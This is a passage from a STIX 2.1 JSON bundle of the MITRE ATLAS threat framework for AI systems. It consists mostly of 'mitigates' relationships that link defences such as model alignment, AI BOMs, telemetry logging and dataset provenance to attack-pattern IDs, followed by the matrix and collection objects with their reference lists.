guiding it away from unsafe prompts and responses.", "source_ref": "course-of-action--55363f1c-b02d-4c28-829a-d8e07c2bf982", "target_ref": "attack-pattern--8ebcea3c-27d4-49d3-aee8-400a682e3bab"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--1efefeb3-2f99-4a1f-bd24-8407f82d4f46", "created": "2025-08-12T19:58:34.766944Z", "modified": "2025-08-12T19:58:34.766944Z", "relationship_type": "mitigates", "description": "Model alignment can improve the parametric safety of a model by guiding it away from unsafe prompts and responses.", "source_ref": "course-of-action--55363f1c-b02d-4c28-829a-d8e07c2bf982", "target_ref": "attack-pattern--e2ea36c0-8e3e-4604-8628-143213eb8276"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--2da834e7-b548-496e-a702-79251caf658b", "created": "2025-08-12T19:58:34.767022Z", "modified": "2025-08-12T19:58:34.767022Z", "relationship_type": "mitigates", "description": "Model alignment can improve the parametric safety of a model by guiding it away from unsafe prompts and responses.", "source_ref": "course-of-action--55363f1c-b02d-4c28-829a-d8e07c2bf982", "target_ref": "attack-pattern--2aca6880-e878-4bc2-b100-e80ce47fb4b6"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--064d4f84-0d23-44d3-ae42-20d821a1624c", "created": "2025-08-12T19:58:34.767168Z", "modified": "2025-08-12T19:58:34.767168Z", "relationship_type": "mitigates", "description": "An AI BOM can help users identify untrustworthy model artifacts.", "source_ref": "course-of-action--df1958aa-be55-468f-bd18-1e611b53e6a2", "target_ref": "attack-pattern--713db620-da51-4bd0-9496-d03c2e2e0564"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--a6c42163-ecd4-4e8d-98fa-f7803da04876", "created": "2025-08-12T19:58:34.767239Z", "modified": "2025-08-12T19:58:34.767239Z", "relationship_type": "mitigates", "description": "An AI BOM can help users identify untrustworthy model artifacts.", "source_ref": "course-of-action--df1958aa-be55-468f-bd18-1e611b53e6a2", "target_ref": "attack-pattern--0d2e410d-cc24-42c3-a26b-86059cb9d976"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--1fbdd211-9ace-405a-bf66-36787d402c08", "created": "2025-08-12T19:58:34.767311Z", "modified": "2025-08-12T19:58:34.767311Z", "relationship_type": "mitigates", "description": "An AI BOM can help users identify untrustworthy model artifacts.", "source_ref": "course-of-action--df1958aa-be55-468f-bd18-1e611b53e6a2", "target_ref": "attack-pattern--85945825-054e-4581-b95c-767be68d1af9"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--3c5d32e5-9de9-403f-864f-09463fc4aa46", "created": "2025-08-12T19:58:34.76739Z", "modified": "2025-08-12T19:58:34.76739Z", "relationship_type": "mitigates", "description": "An AI BOM can help users identify untrustworthy model artifacts.", "source_ref": "course-of-action--df1958aa-be55-468f-bd18-1e611b53e6a2", "target_ref": "attack-pattern--d01827d1-93a4-4209-b465-547400300eda"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--f002e1aa-02e5-4f05-a69a-d17e9a7d66f2", "created": "2025-08-12T19:58:34.767535Z", "modified": "2025-08-12T19:58:34.767535Z", "relationship_type": "mitigates", "description": "Telemetry logging can help identify if sensitive data has been exfiltrated.", "source_ref": "course-of-action--0d1df9c8-0972-4a8e-8cbd-41039c0c0e19", "target_ref": "attack-pattern--7a255ad9-ec2a-4520-bb72-fb407429eb2f"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--43e0ebe0-0495-4155-ab6e-0954c6d0f842", "created": "2025-08-12T19:58:34.767605Z", "modified": "2025-08-12T19:58:34.767605Z", "relationship_type": "mitigates", "description": "Telemetry logging can help identify if sensitive data has been exfiltrated.", "source_ref": "course-of-action--0d1df9c8-0972-4a8e-8cbd-41039c0c0e19", "target_ref": "attack-pattern--4a6b746e-98fc-4c70-9025-31ada433aca5"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--ede87428-6ffb-4c68-bf9e-3df81cd91de1", "created": "2025-08-12T19:58:34.767675Z", "modified": "2025-08-12T19:58:34.767675Z", "relationship_type": "mitigates", "description": "Telemetry logging can help identify if sensitive data has been exfiltrated.", "source_ref": "course-of-action--0d1df9c8-0972-4a8e-8cbd-41039c0c0e19", "target_ref": "attack-pattern--9e5d356e-592e-4cbf-9354-44f3fbd3a38a"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--150ce844-1b34-4219-b41a-7a6cd5999364", "created": "2025-08-12T19:58:34.767747Z", "modified": "2025-08-12T19:58:34.767747Z", "relationship_type": "mitigates", "description": "Telemetry logging can help identify if sensitive data has been exfiltrated.", "source_ref": "course-of-action--0d1df9c8-0972-4a8e-8cbd-41039c0c0e19", "target_ref": "attack-pattern--9f3f1f1e-e34a-4349-ae97-9c0fb1e4d426"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--e9ab34bc-6474-46c8-829d-a4f6738e71c8", "created": "2025-08-12T19:58:34.767815Z", "modified": "2025-08-12T19:58:34.767815Z", "relationship_type": "mitigates", "description": "Telemetry logging can help identify if a proxy training dataset has been exfiltrated.", "source_ref": "course-of-action--0d1df9c8-0972-4a8e-8cbd-41039c0c0e19", "target_ref": "attack-pattern--15798faf-f127-4af1-a39f-a2987b6893b4"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--fb80695c-0a32-44d0-9b9b-0e38cbc98d86", "created": "2025-08-12T19:58:34.76788Z", "modified": "2025-08-12T19:58:34.76788Z", "relationship_type": "mitigates", "description": "Telemetry logging can help audit API usage of the model.", "source_ref": "course-of-action--0d1df9c8-0972-4a8e-8cbd-41039c0c0e19", "target_ref": "attack-pattern--62f636dd-9f62-4f22-adc2-471c3f061e9d"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--b339c887-5d3e-4e99-9a59-a044fa3b398e", "created": "2025-08-12T19:58:34.767944Z", "modified": "2025-08-12T19:58:34.767944Z", "relationship_type": "mitigates", "description": "Telemetry logging can help identify if sensitive model information has been sent to an attacker.", "source_ref": "course-of-action--0d1df9c8-0972-4a8e-8cbd-41039c0c0e19", "target_ref": "attack-pattern--1b9b6889-8f46-4417-a45f-d470ac8f002b"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--2e2f1a5c-75d1-4a5c-850e-aa842a5543a7", "created": "2025-08-12T19:58:34.768018Z", "modified": "2025-08-12T19:58:34.768018Z", "relationship_type": "mitigates", "description": "Telemetry logging can help identify if unsafe prompts have been submitted to the LLM.", "source_ref": "course-of-action--0d1df9c8-0972-4a8e-8cbd-41039c0c0e19", "target_ref": "attack-pattern--e2ea36c0-8e3e-4604-8628-143213eb8276"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--bf021076-43c3-4085-b543-e88e9c0ff16a", "created": "2025-08-12T19:58:34.768092Z", "modified": "2025-08-12T19:58:34.768092Z", "relationship_type": "mitigates", "description": "Telemetry logging can help identify if unsafe prompts have been submitted to the LLM.", "source_ref": "course-of-action--0d1df9c8-0972-4a8e-8cbd-41039c0c0e19", "target_ref": "attack-pattern--c9ba8911-fb11-43f0-a6d1-53140ff39d2e"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--eec1a4ff-5257-46d1-a32a-d2fa2721861c", "created": "2025-08-12T19:58:34.768166Z", "modified": "2025-08-12T19:58:34.768166Z", "relationship_type": "mitigates", "description": "Telemetry logging can help identify if unsafe prompts have been submitted to the LLM.", "source_ref": "course-of-action--0d1df9c8-0972-4a8e-8cbd-41039c0c0e19", "target_ref": "attack-pattern--da54d2c9-a64b-4e9d-b3cd-bdd1fdc03a21"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--b0f44e41-2e84-48ea-8817-7f54c1305ce7", "created": "2025-08-12T19:58:34.768301Z", "modified": "2025-08-12T19:58:34.768301Z", "relationship_type": "mitigates", "description": "Dataset provenance can protect against supply chain compromise of data.", "source_ref": "course-of-action--fb2f4bad-bf77-410c-9756-5afa7a5113fd", "target_ref": "attack-pattern--13ecefc0-d955-42e5-8b6d-d3e3ff55a775"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--6eacfac2-1cdb-47d6-8b84-bac7872dbaef", "created": "2025-08-12T19:58:34.768369Z", "modified": "2025-08-12T19:58:34.768369Z", "relationship_type": "mitigates", "description": "Dataset provenance can protect against poisoning of training data", "source_ref": "course-of-action--fb2f4bad-bf77-410c-9756-5afa7a5113fd", "target_ref": "attack-pattern--85945825-054e-4581-b95c-767be68d1af9"}, {"type": "relationship", "spec_version": "2.1", "id": "relationship--4beed365-ca6b-4468-9882-2e447140f020", "created": "2025-08-12T19:58:34.768438Z", "modified": "2025-08-12T19:58:34.768438Z", "relationship_type": "mitigates", "description": "Dataset provenance can protect against poisoning of models.", "source_ref": "course-of-action--fb2f4bad-bf77-410c-9756-5afa7a5113fd", "target_ref": "attack-pattern--f4dfd872-4133-4dde-a901-433a9a0970a9"}, {"type": "x-mitre-matrix", "spec_version": "2.1", "id": "x-mitre-matrix--eb4074e2-6c44-426f-a0ac-c8128dcd47c3", "created": "2025-08-12T19:58:34.768565Z", "modified": "2025-08-12T19:58:34.768565Z", "name": "ATLAS Matrix", "description": "ATLAS matrix for ATLAS Matrix", "external_references": [{"source_name": "mitre-atlas", "url": "https://atlas.mitre.org", "external_id": "mitre-atlas"}], "tactic_refs": ["x-mitre-tactic--e419ce6f-0733-48b6-a428-a14beddddb96", "x-mitre-tactic--07ea9f43-aeca-420d-be12-57b6572e313c", "x-mitre-tactic--725b8ce5-4072-4e38-955e-3a1569a97500", "x-mitre-tactic--f565a9be-46e3-4cd3-8dd7-b08ed5ad2a83", "x-mitre-tactic--70d6b227-779b-4cb4-801d-afd357d3b856", "x-mitre-tactic--c4bb706b-c830-49ad-baf1-79fbba5dcdf5", "x-mitre-tactic--5f0321c8-001d-473b-aa9e-c30cbc510d4f", "x-mitre-tactic--f815361d-780b-4f9b-ad09-ef4e29ec4a13", "x-mitre-tactic--901e36e1-f221-4123-bce4-d7dd7cad017f", "x-mitre-tactic--36c2822a-d608-4e9d-98c9-56052e10999d", "x-mitre-tactic--4afb8598-f27f-45e8-bcbf-c34041c66c9a", "x-mitre-tactic--7b4f91df-6744-4773-a2f8-65315293e7a6", "x-mitre-tactic--74bc7496-5ffe-4b6f-a26e-dfaaa5760c32", "x-mitre-tactic--f4439668-ae25-480b-9bba-9a54e9c23ed7", "x-mitre-tactic--f45800a5-6206-4862-b3ae-0a9f02dc6b13"]}, {"type": "x-mitre-collection", "spec_version": "2.1", "id": "x-mitre-collection--82bda052-6bc7-469a-a1d1-d4040af725e3", "created_by_ref": "identity--c83fdf38-afa6-400c-b09b-622fba22c083", "created": "2025-08-12T19:58:34.769037Z", "modified": "2025-08-12T19:58:34.769037Z", "name": "ATLAS", "description": "Adversarial Threat Landscape for AI Systems", "x_mitre_attack_spec_version": "2.1.0", "x_mitre_contents": [{"object_ref": "x-mitre-tactic--e419ce6f-0733-48b6-a428-a14beddddb96", "object_modified": "2025-08-12T19:58:34.757383Z"}, {"object_ref": "x-mitre-tactic--07ea9f43-aeca-420d-be12-57b6572e313c", "object_modified": "2025-08-12T19:58:34.757467Z"}, {"object_ref": "x-mitre-tactic--725b8ce5-4072-4e38-955e-3a1569a97500", "object_modified": "2025-08-12T19:58:34.757542Z"}, {"object_ref": "x-mitre-tactic--f565a9be-46e3-4cd3-8dd7-b08ed5ad2a83", "object_modified": "2025-08-12T19:58:34.757616Z"}, {"object_ref": "x-mitre-tactic--70d6b227-779b-4cb4-801d-afd357d3b856", "object_modified": "2025-08-12T19:58:34.757689Z"}, {"object_ref": "x-mitre-tactic--c4bb706b-c830-49ad-baf1-79fbba5dcdf5", "object_modified": "2025-08-12T19:58:34.757765Z"}, {"object_ref": "x-mitre-tactic--5f0321c8-001d-473b-aa9e-c30cbc510d4f", "object_modified": "2025-08-12T19:58:34.757839Z"}, {"object_ref": "x-mitre-tactic--f815361d-780b-4f9b-ad09-ef4e29ec4a13", "object_modified": "2025-08-12T19:58:34.757912Z"}, {"object_ref": "x-mitre-tactic--901e36e1-f221-4123-bce4-d7dd7cad017f", "object_modified": "2025-08-12T19:58:34.757983Z"}, {"object_ref": "x-mitre-tactic--36c2822a-d608-4e9d-98c9-56052e10999d", "object_modified": "2025-08-12T19:58:34.758056Z"}, {"object_ref": "x-mitre-tactic--4afb8598-f27f-45e8-bcbf-c34041c66c9a", "object_modified": "2025-08-12T19:58:34.758128Z"}, {"object_ref": "x-mitre-tactic--7b4f91df-6744-4773-a2f8-65315293e7a6", "object_modified": "2025-08-12T19:58:34.758199Z"}, {"object_ref": "x-mitre-tactic--74bc7496-5ffe-4b6f-a26e-dfaaa5760c32", "object_modified": "2025-08-12T19:58:34.758271Z"}, {"object_ref": "x-mitre-tactic--f4439668-ae25-480b-9bba-9a54e9c23ed7", "object_modified": "2025-08-12T19:58:34.758343Z"}, {"object_ref": "x-mitre-tactic--f45800a5-6206-4862-b3ae-0a9f02dc6b13", "object_modified": "2025-08-12T19:58:34.758414Z"}, {"object_ref": "attack-pattern--3ac1b7da-0993-4e3f-a90f-710f0e901906", "object_modified": "2025-08-12T19:58:34.744144Z"}, {"object_ref": "attack-pattern--eb9695c5-380a-43cc-b758-7004449f058d", "object_modified": "2025-08-12T19:58:34.744358Z"}, {"object_ref": "attack-pattern--1bccd478-edf1-4a20-bb05-8842e8ce48f5", "object_modified": "2025-08-12T19:58:34.744696Z"}, {"object_ref": "attack-pattern--d1e9dbb1-e5f8-4c40-86ca-f328b06a023f", "object_modified": "2025-08-12T19:58:34.744858Z"}, {"object_ref": "attack-pattern--c97e17f6-1d83-4c78-b5a2-4c348279b300", "object_modified": "2025-08-12T19:58:34.745028Z"}, {"object_ref": "attack-pattern--be091749-3b46-463f-9df2-3eddc05ca8c0", "object_modified": "2025-08-12T19:58:34.745125Z"}, {"object_ref": "attack-pattern--4ba93236-1f61-4405-b7f4-a8b6be4c0d97", "object_modified": "2025-08-12T19:58:34.745217Z"}, {"object_ref": "attack-pattern--1ca5e771-823c-4f3f-b203-0c10d18b3509", "object_modified": "2025-08-12T19:58:34.745312Z"}, {"object_ref": "attack-pattern--762c1ab1-4885-4ac6-b167-f72135a54444", "object_modified": "2025-08-12T19:58:34.745402Z"}, {"object_ref": "attack-pattern--b98c5698-984d-49a4-9353-b62cdc27409b", "object_modified": "2025-08-12T19:58:34.745482Z"}, {"object_ref": "attack-pattern--c2ac1f16-43b3-464b-bf64-f352c6986692", "object_modified": "2025-08-12T19:58:34.745629Z"}, {"object_ref": "attack-pattern--d5288537-b502-445f-b5ce-41c625b39162", "object_modified": "2025-08-12T19:58:34.745787Z"}, {"object_ref": "attack-pattern--d2d19d63-0d24-48be-bb96-cce753f05fab", "object_modified": "2025-08-12T19:58:34.745867Z"}, {"object_ref": "attack-pattern--6c7b7972-39ae-4188-89ee-72dee4b9410d", "object_modified": "2025-08-12T19:58:34.746011Z"}, {"object_ref": "attack-pattern--816a46e5-b654-4bc5-ab65-36f962ff2a15", "object_modified": "2025-08-12T19:58:34.746169Z"}, {"object_ref": "attack-pattern--3f0f88eb-8f24-4ae0-9049-2f8b892cf149", "object_modified": "2025-08-12T19:58:34.746251Z"}, {"object_ref": "attack-pattern--828ce387-26a1-4e8f-8f4e-9018748282c4", "object_modified": "2025-08-12T19:58:34.746406Z"}, {"object_ref": "attack-pattern--4a9ac079-addd-4dfa-98c3-73606d4e75e3", "object_modified": "2025-08-12T19:58:34.746487Z"}, {"object_ref": "attack-pattern--3630cf80-5c1d-4179-99e8-95cb11d16a52", "object_modified": "2025-08-12T19:58:34.746628Z"}, {"object_ref": "attack-pattern--0d2e410d-cc24-42c3-a26b-86059cb9d976", "object_modified": "2025-08-12T19:58:34.746779Z"}, {"object_ref": "attack-pattern--014b45cd-0f8f-447f-b92e-daeaaa03c6bd", "object_modified": "2025-08-12T19:58:34.746866Z"}, {"object_ref": "attack-pattern--f0725321-e7a4-476c-aef3-ea72ec6d29b8", "object_modified": "2025-08-12T19:58:34.746941Z"}, {"object_ref": "attack-pattern--8128388c-cca0-4c81-bbe5-d3421ac5d3df", "object_modified": "2025-08-12T19:58:34.747078Z"}, {"object_ref": "attack-pattern--13ecefc0-d955-42e5-8b6d-d3e3ff55a775", "object_modified": "2025-08-12T19:58:34.747217Z"}, {"object_ref": "attack-pattern--c63744cb-a84e-4ed1-93f4-efa757770e66", "object_modified": "2025-08-12T19:58:34.747354Z"}, {"object_ref": "attack-pattern--62f636dd-9f62-4f22-adc2-471c3f061e9d", "object_modified": "2025-08-12T19:58:34.747503Z"}, {"object_ref": "attack-pattern--1b9b6889-8f46-4417-a45f-d470ac8f002b", "object_modified": "2025-08-12T19:58:34.74759Z"}, {"object_ref": "attack-pattern--f5b5647e-6823-4f76-9c33-735da7fb37d3", "object_modified": "2025-08-12T19:58:34.747675Z"}, {"object_ref": "attack-pattern--65a7290b-006b-4961-b51f-9aa0b132fab3", "object_modified": "2025-08-12T19:58:34.747762Z"}, {"object_ref": "attack-pattern--d14c8181-1bb2-4c82-b5ea-daacee09aa16", "object_modified": "2025-08-12T19:58:34.747848Z"}, {"object_ref": "attack-pattern--7da2c306-0c7b-4ca4-80d0-8235cc6cd588", "object_modified": "2025-08-12T19:58:34.747934Z"}, {"object_ref": "attack-pattern--85945825-054e-4581-b95c-767be68d1af9", "object_modified": "2025-08-12T19:58:34.748031Z"}, {"object_ref": "attack-pattern--e1822c47-4d18-45c4-9612-047e53864eb4", "object_modified": "2025-08-12T19:58:34.748115Z"}, {"object_ref": "attack-pattern--673c47c6-1620-4fd8-b49b-6d81a14d17cd", "object_modified": "2025-08-12T19:58:34.7482Z"}, {"object_ref": "attack-pattern--fe9d87d1-bb0a-4f57-9d69-9d2aacc19941", "object_modified": "2025-08-12T19:58:34.748275Z"}, {"object_ref": "attack-pattern--15798faf-f127-4af1-a39f-a2987b6893b4", "object_modified": "2025-08-12T19:58:34.748417Z"}, {"object_ref": "attack-pattern--ff764f50-dce3-4bbd-83fb-7b0a0df20e88", "object_modified": "2025-08-12T19:58:34.748559Z"}, {"object_ref": "attack-pattern--b03e5d58-e4ab-4377-8fea-2a506d3a13ed", "object_modified": "2025-08-12T19:58:34.748711Z"}, {"object_ref": "attack-pattern--36e33591-e21d-43cd-aa32-a2ad2c9e8d1e", "object_modified": "2025-08-12T19:58:34.7488Z"}, {"object_ref": "attack-pattern--713db620-da51-4bd0-9496-d03c2e2e0564", "object_modified": "2025-08-12T19:58:34.748875Z"}, {"object_ref": "attack-pattern--6923abee-06a8-4fcd-853e-d0a1e374490f", "object_modified": "2025-08-12T19:58:34.749026Z"}, {"object_ref": "attack-pattern--617a8d41-f0fd-4b88-a6c2-66fa5ca45efd", "object_modified": "2025-08-12T19:58:34.749137Z"}, {"object_ref": "attack-pattern--cf6f094e-1011-4643-91f3-487ac2803aaf", "object_modified": "2025-08-12T19:58:34.749237Z"}, {"object_ref": "attack-pattern--f4dfd872-4133-4dde-a901-433a9a0970a9", "object_modified": "2025-08-12T19:58:34.749313Z"}, {"object_ref": "attack-pattern--a2de5e8e-2a0a-4d64-81cf-4370131e5922", "object_modified": "2025-08-12T19:58:34.749459Z"}, {"object_ref": "attack-pattern--7a255ad9-ec2a-4520-bb72-fb407429eb2f", "object_modified": "2025-08-12T19:58:34.749613Z"}, {"object_ref": "attack-pattern--4a6b746e-98fc-4c70-9025-31ada433aca5", "object_modified": "2025-08-12T19:58:34.749693Z"}, {"object_ref": "attack-pattern--9e5d356e-592e-4cbf-9354-44f3fbd3a38a", "object_modified": "2025-08-12T19:58:34.749832Z"}, {"object_ref": "attack-pattern--9f3f1f1e-e34a-4349-ae97-9c0fb1e4d426", "object_modified": "2025-08-12T19:58:34.749971Z"}, {"object_ref": "attack-pattern--35d567af-54b2-4b13-ab9e-b77776967091", "object_modified": "2025-08-12T19:58:34.75021Z"}, {"object_ref": "attack-pattern--d37ba04b-06cc-4909-9990-33d1a24b4fc0", "object_modified": "2025-08-12T19:58:34.750301Z"}, {"object_ref": "attack-pattern--05041d9e-0ece-4f2f-b659-6c6136e34d12", "object_modified": "2025-08-12T19:58:34.750388Z"}, {"object_ref": "attack-pattern--711f66ad-d72b-4037-87a6-614a7ff9e000", "object_modified": "2025-08-12T19:58:34.750476Z"}, {"object_ref": "attack-pattern--56022f01-f3e9-442e-b1aa-8e2b50560d22", "object_modified": "2025-08-12T19:58:34.750568Z"}, {"object_ref": "attack-pattern--a5d1adea-11f5-4ed0-94f3-78d19b40c8fd", "object_modified": "2025-08-12T19:58:34.750655Z"}, {"object_ref": "attack-pattern--8f869719-7ecb-4135-8511-79c68f141a69", "object_modified": "2025-08-12T19:58:34.750743Z"}, {"object_ref": "attack-pattern--4cb7c83b-5627-4762-8323-91e08c480064", "object_modified": "2025-08-12T19:58:34.750827Z"}, {"object_ref": "attack-pattern--ea1fa6da-3fa9-40b4-be04-ea076a20ff0c", "object_modified": "2025-08-12T19:58:34.750913Z"}, {"object_ref": "attack-pattern--c8f02784-46a0-4d87-8836-bd0eaccbc4cb", "object_modified": "2025-08-12T19:58:34.750999Z"}, {"object_ref": "attack-pattern--5e379496-6393-41d5-b392-ba96edbe4f86", "object_modified": "2025-08-12T19:58:34.751075Z"}, {"object_ref": "attack-pattern--cc16b8bf-0a76-4335-b3db-969399dac525", "object_modified": "2025-08-12T19:58:34.751215Z"}, {"object_ref": "attack-pattern--b6fceafb-8079-4f36-b4b7-54d62832a111", "object_modified": "2025-08-12T19:58:34.751356Z"}, {"object_ref": "attack-pattern--c53ecb95-432c-4681-a6ca-971d2da001bc", "object_modified": "2025-08-12T19:58:34.751497Z"}, {"object_ref": "attack-pattern--853ef456-d9ca-4383-9574-d2684ef4b231", "object_modified": "2025-08-12T19:58:34.751638Z"}, {"object_ref": "attack-pattern--2f84bcd7-4291-4978-bfbd-e801ae2c501e", "object_modified": "2025-08-12T19:58:34.751793Z"}, {"object_ref": "attack-pattern--41642416-9252-4d86-9824-396bc0f1b1a9", "object_modified": "2025-08-12T19:58:34.751991Z"}, {"object_ref": "attack-pattern--aecd0fff-8f6c-46ec-b8f0-6f4cbd7fdc5f", "object_modified": "2025-08-12T19:58:34.752156Z"}, {"object_ref": "attack-pattern--f28e7e61-a369-405d-b816-cee59c2d1360", "object_modified": "2025-08-12T19:58:34.752305Z"}, {"object_ref": "attack-pattern--3bfb06ff-bb5f-4535-95c7-f8e026e6fced", "object_modified": "2025-08-12T19:58:34.752444Z"}, {"object_ref": "attack-pattern--6849f610-5eb5-4b0d-9f88-82b2bbf3fd43", "object_modified": "2025-08-12T19:58:34.752584Z"}, {"object_ref": "attack-pattern--e15ad3ee-f5fa-41ae-8870-67b01755b220", "object_modified": "2025-08-12T19:58:34.752734Z"}, {"object_ref": "attack-pattern--02118032-70ce-43ff-881e-07e0efc94499", "object_modified": "2025-08-12T19:58:34.752822Z"}, {"object_ref": "attack-pattern--e2ea36c0-8e3e-4604-8628-143213eb8276", "object_modified": "2025-08-12T19:58:34.752908Z"}, {"object_ref": "attack-pattern--c9ba8911-fb11-43f0-a6d1-53140ff39d2e", "object_modified": "2025-08-12T19:58:34.752981Z"}, {"object_ref": "attack-pattern--da54d2c9-a64b-4e9d-b3cd-bdd1fdc03a21", "object_modified": "2025-08-12T19:58:34.753118Z"}, {"object_ref": "attack-pattern--f17d0af8-5385-4eb4-a391-09017ac9783d", "object_modified": "2025-08-12T19:58:34.753264Z"}, {"object_ref": "attack-pattern--59aaa7f2-5a54-45cd-8de4-1896ec44566b", "object_modified": "2025-08-12T19:58:34.753341Z"}, {"object_ref": "attack-pattern--8ebcea3c-27d4-49d3-aee8-400a682e3bab", "object_modified": "2025-08-12T19:58:34.753501Z"}, {"object_ref": "attack-pattern--fe1b057b-ad2f-4bfc-90f1-a456e17dee9d", "object_modified": "2025-08-12T19:58:34.753599Z"}, {"object_ref": "attack-pattern--fb6e3d21-7383-49d8-9a25-1f831184a2ed", "object_modified": "2025-08-12T19:58:34.753684Z"}, {"object_ref": "attack-pattern--5c7dee7b-62ca-44a4-99ca-2412459d0124", "object_modified": "2025-08-12T19:58:34.753768Z"}, {"object_ref": "attack-pattern--2aca6880-e878-4bc2-b100-e80ce47fb4b6", "object_modified": "2025-08-12T19:58:34.753853Z"}, {"object_ref": "attack-pattern--d01827d1-93a4-4209-b465-547400300eda", "object_modified": "2025-08-12T19:58:34.753937Z"}, {"object_ref": "attack-pattern--86195060-a734-45e1-b616-ab224e31e8f3", "object_modified": "2025-08-12T19:58:34.75402Z"}, {"object_ref": "attack-pattern--30fc8375-1772-43ca-a73a-0db501756852", "object_modified": "2025-08-12T19:58:34.754094Z"}, {"object_ref": "attack-pattern--03c0c81a-2840-4251-8b85-1681b21d9e5d", "object_modified": "2025-08-12T19:58:34.754242Z"}, {"object_ref": "attack-pattern--cfd9296e-981f-4be4-a3ce-04521676ca0e", "object_modified": "2025-08-12T19:58:34.75433Z"}, {"object_ref": "attack-pattern--ab989163-432c-4466-aad8-4d0b0c4f2051", "object_modified": "2025-08-12T19:58:34.754415Z"}, {"object_ref": "attack-pattern--374f1fa9-3abc-4b58-8bc5-ceb10c3c0a2b", "object_modified": "2025-08-12T19:58:34.754491Z"}, {"object_ref": "attack-pattern--056a22ff-1355-44e0-8ee8-7139341188ab", "object_modified": "2025-08-12T19:58:34.754628Z"}, {"object_ref": "attack-pattern--222e7ac0-82fe-4570-a5cb-6794a2b93335", "object_modified": "2025-08-12T19:58:34.754778Z"}, {"object_ref": "attack-pattern--869faa3d-21e5-436b-8839-8ede09909285", "object_modified": "2025-08-12T19:58:34.754856Z"}, {"object_ref": "attack-pattern--569d2697-1cc4-406e-8eee-050d2c208ef9", "object_modified": "2025-08-12T19:58:34.755011Z"}, {"object_ref": "attack-pattern--b3f203c7-1204-431d-b4d1-8bc1a04c6bf5", "object_modified": "2025-08-12T19:58:34.755099Z"}, {"object_ref": "attack-pattern--978fa602-2719-4836-a0af-ce67adebf21e", "object_modified": "2025-08-12T19:58:34.755186Z"}, {"object_ref": "attack-pattern--508d3e8b-1457-4b04-8685-be14dd421cf9", "object_modified": "2025-08-12T19:58:34.755272Z"}, {"object_ref": "attack-pattern--07f9e660-1a1f-4e2a-935c-c511e7d2d304", "object_modified": "2025-08-12T19:58:34.755357Z"}, {"object_ref": "attack-pattern--89a68366-0bd4-4344-b30b-2b859d2d1d54", "object_modified": "2025-08-12T19:58:34.755442Z"}, {"object_ref": "attack-pattern--02c6a7e0-475a-4752-bb53-c375700138c8", "object_modified": "2025-08-12T19:58:34.755515Z"}, {"object_ref": "attack-pattern--ea86c03d-6509-4bcb-a0dc-61f02309dc4f", "object_modified": "2025-08-12T19:58:34.755652Z"}, {"object_ref": "attack-pattern--8b85fd7f-77fe-46ab-8842-964a9cca4bd8", "object_modified": "2025-08-12T19:58:34.755792Z"}, {"object_ref": "attack-pattern--cd22548c-eb05-499a-a267-19c283d38c99", "object_modified": "2025-08-12T19:58:34.755941Z"}, {"object_ref": "attack-pattern--18a1f52d-8e32-4e76-831d-f590c4b98196", "object_modified": "2025-08-12T19:58:34.756029Z"}, {"object_ref": "attack-pattern--7173dc23-7ce1-4d38-a6fa-15f6aa8e76c4", "object_modified": "2025-08-12T19:58:34.756104Z"}, {"object_ref": "attack-pattern--e0e50373-4d78-4630-860c-8188fc3eefcb", "object_modified": "2025-08-12T19:58:34.756241Z"}, {"object_ref": "attack-pattern--47eecd80-97f8-4877-8f0d-549253f4e432", "object_modified": "2025-08-12T19:58:34.756379Z"}, {"object_ref": "attack-pattern--82cc67bf-b217-4a52-8360-1d4ed2bb8793", "object_modified": "2025-08-12T19:58:34.756524Z"}, {"object_ref": "attack-pattern--2d20164c-a7b1-4838-89aa-f6db43d5abe3", "object_modified": "2025-08-12T19:58:34.75661Z"}, {"object_ref": "attack-pattern--74c298b9-adf8-43eb-84d7-f7c1928b8883", "object_modified": "2025-08-12T19:58:34.756695Z"}, {"object_ref": "attack-pattern--a4bea531-f60f-463b-8e69-aafb951ec916", "object_modified": "2025-08-12T19:58:34.75678Z"}, {"object_ref": "attack-pattern--4474e2c7-ef58-4adf-8d2d-8ce55deedec5", "object_modified": "2025-08-12T19:58:34.756862Z"}, {"object_ref": "attack-pattern--5d35bff4-a8f5-453f-b3a1-2413336739ad", "object_modified": "2025-08-12T19:58:34.756949Z"}, {"object_ref": "attack-pattern--b2954419-50fe-4919-b69d-cb6aca2e553e", "object_modified": "2025-08-12T19:58:34.757022Z"}, {"object_ref": "attack-pattern--f54c0789-e3a1-4683-bfff-90fd237034b6", "object_modified": "2025-08-12T19:58:34.757173Z"}, {"object_ref": "attack-pattern--77c877fb-3dde-4051-a565-1ad93868090b", "object_modified": "2025-08-12T19:58:34.757261Z"}, {"object_ref": "course-of-action--9c18d1cf-cf39-49e6-a60c-bd0cd34e381c", "object_modified": "2025-08-12T19:58:34.758502Z"}, {"object_ref": "course-of-action--d40b9028-ea1d-477b-95e4-b875ecefb72e", "object_modified": "2025-08-12T19:58:34.75885Z"}, {"object_ref": "course-of-action--517ba232-61b8-42f4-a609-ef487befcba6", "object_modified": "2025-08-12T19:58:34.759128Z"}, {"object_ref": "course-of-action--70fa8e8c-dd1f-480b-b077-49b3a8a368e4", "object_modified": "2025-08-12T19:58:34.759717Z"}, {"object_ref": "course-of-action--18cd3888-52e3-47d4-8986-2c8e2ddb172d", "object_modified": "2025-08-12T19:58:34.759944Z"}, {"object_ref": "course-of-action--e1cc319e-11c3-4492-859e-31fafdb015b9", "object_modified": "2025-08-12T19:58:34.760716Z"}, {"object_ref": "course-of-action--f8eafc3b-e449-43e5-8a77-ced965d047d2", "object_modified": "2025-08-12T19:58:34.761264Z"}, {"object_ref": "course-of-action--93413c78-9844-4807-82fc-805b991f13a0", "object_modified": "2025-08-12T19:58:34.761667Z"}, {"object_ref": 